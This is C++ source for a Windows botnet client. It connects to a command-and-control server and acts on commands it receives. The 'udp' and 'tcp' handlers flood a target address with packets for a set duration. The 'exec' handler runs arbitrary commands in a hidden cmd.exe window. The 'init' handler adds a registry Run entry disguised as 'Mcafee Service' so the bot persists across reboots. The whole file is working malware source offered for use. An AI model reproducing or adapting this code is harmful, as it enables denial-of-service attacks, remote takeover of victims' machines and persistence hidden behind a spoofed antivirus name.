#include "client.hpp"
#include <time.h>

client::client(std::string host, int port)
{
    this->host = host;
    this->port = port;
}

char *client::currentpath()
{
    char *path = new char[MAX_PATH];
    memset(path, 0, MAX_PATH);
    GetModuleFileNameA(GetModuleHandleA(NULL), path, MAX_PATH);
    return path;
}

bool client::setup()
{
    if (this->isBufferAllocated == false)
    {
        this->buffer = new char[MAX_BUFFER];
        this->isBufferAllocated = true;
    }
    memset(this->buffer, 0, MAX_BUFFER);
    WSAStartup(MAKEWORD(2, 2), &this->wsaData);
    this->wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    if (this->wSock == INVALID_SOCKET)
        return false;
    this->addr.sin_family = AF_INET;
    this->addr.sin_port = htons(this->port);
    this->addr.sin_addr.s_addr = inet_addr(this->host.c_str());

    if (WSAConnect(this->wSock, (SOCKADDR*)&this->addr, sizeof(this->addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
        return false;
    
    return true;
}

void client::init()
{
    HKEY hKey;
    char *czExePath = currentpath();
    const char* czStartName = "Mcafee Service ©";

    LONG lnRes = RegOpenKeyExA(  HKEY_CURRENT_USER,
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0, 
                                KEY_WRITE,
                                &hKey);
    if( ERROR_SUCCESS == lnRes )
    {
        lnRes = RegSetValueExA(  hKey,
                                czStartName,
                                0,
                                REG_SZ,
                                (unsigned char*)czExePath,
                                strlen(czExePath)
        );
    }

    RegCloseKey(hKey);
    free(czExePath);
}

void client::cleanup()
{
    memset(this->buffer, 0, MAX_BUFFER);
    if (this->buffer)
        delete[] this->buffer;
    WSACleanup();
}

void client::buffclean()
{
    for (int i = 0; i < strlen(this->buffer); i++)
    {
        if (this->buffer[i] == '\r' || this->buffer[i] == '\n')
            this->buffer[i] = 0;
    }
}

void client::udp()
{
    SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in si_other;
    int slen = sizeof(si_other);
    memset((char *)&si_other, 0, sizeof(si_other));
    si_other.sin_family = AF_INET;
    si_other.sin_port = htons(std::stoi(this->buffsplit[2]));
    si_other.sin_addr.s_addr = inet_addr(this->buffsplit[1].c_str());
    char *data = new char[65507];
    memset(data, 0, 65507);
    for (int i = 0; i < 65507; i++)
        data[i] = 'A';
    time_t end_time = time(NULL) + std::stoi(this->buffsplit[3]);
    while (time(NULL) < end_time)
        sendto(s, data, 65507, 0, (struct sockaddr *)&si_other, slen);
    closesocket(s);
    delete[] data;
}

void client::tcp()
{
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in si_other;
    int slen = sizeof(si_other);
    memset((char *)&si_other, 0, sizeof(si_other));
    si_other.sin_family = AF_INET;
    si_other.sin_port = htons(std::stoi(this->buffsplit[2]));
    si_other.sin_addr.s_addr = inet_addr(this->buffsplit[1].c_str());
    char *data = new char[65507];
    memset(data, 0, 65507);
    for (int i = 0; i < 65507; i++)
        data[i] = 'A';
    time_t end_time = time(NULL) + std::stoi(this->buffsplit[3]);
    while (time(NULL) < end_time)
        sendto(s, data, 65507, 0, (struct sockaddr *)&si_other, slen);
    closesocket(s);
    delete[] data;
}

void client::exec()
{
    std::string cmd{};
    for (int i = 0; i < this->buffsplit.size(); i++)
    {
        if (i == 0) continue;
        cmd += this->buffsplit[i] + " ";
    }
    ShellExecuteA(0, "open", "cmd.exe", std::string("/C " + cmd).c_str(), 0, SW_HIDE);
}

void client::handler()
{
    while (true)
    {
        memset(
            this->buffer,
            0,
            MAX_BUFFER
        );
        if (recv
                (
                    this->wSock,
                    this->buffer,
                    MAX_BUFFER,
                    MSG_NOSIGNAL
                ) > 0 
            )
        {
            this->isSessionValid = true;
            this->buffclean();
            this->buffsplit.clear();
            this->buffsplit = utils::split(this->buffer, " ");
            if (this->buffsplit[0] == "udp")
                std::thread(&client::udp, this).detach();
            else if (this->buffsplit[0] == "tcp")
                std::thread(&client::tcp, this).detach();
            else if (this->buffsplit[0] == "exec")
                std::thread(&client::exec, this).detach();
            else if (this->buffsplit[0] == "init")
                this->init();
            else if (this->buffsplit[0] == "exit")
                this->isKill = true;
        }
        else
            this->isSessionValid = false;
    }
}